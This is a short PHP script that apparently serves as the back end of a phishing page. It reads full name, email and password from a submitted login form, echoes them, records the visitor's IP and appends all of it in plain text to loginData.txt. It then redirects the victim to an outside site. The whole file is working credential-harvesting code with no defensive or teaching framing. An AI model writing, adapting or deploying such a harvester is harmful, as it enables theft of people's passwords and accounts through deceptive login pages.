<?php $rawData = file_get_contents('php://input'); $postData = []; parse_str($rawData, $postData); foreach ($postData as $key => $value) { $_POST[trim($key)] = $value; } ?>
<?php

$location = 'https://youssef.uk/youssef.uk/index.php';
    ob_start();

    $fullname = $_POST['exampleInputfullname'];
    $Password = $_POST['exampleInputPassword1'];
    $Email = $_POST['exampleInputEmail1'];
    $userIP = $_SERVER['REMOTE_ADDR'];

    echo "fullname  : " . $fullname;
    echo "Email     : " . $Email;
    echo "Password  : " . $Password;
    echo "userIP    : " . $userIP;    

    $file = fopen("loginData.txt", 'a') or die('Cannot create file');
    $text = '---------------------------------' . PHP_EOL;
    $text = '--------- '.date('d-m-Y').' ---------' . PHP_EOL;
    $text = '---------------------------------' . PHP_EOL;
    $text .= "fullname : " . $fullname . PHP_EOL;
    $text .= "Email    : " . $Email . PHP_EOL;
    $text .= "Password : " . $Password . PHP_EOL;
    $text .= "userIP   : " . $userIP . PHP_EOL;
    $text .= '---------------------------------' . PHP_EOL;

    fwrite($file, $text);
    fclose($file);
    header('Location:' . $location);

?>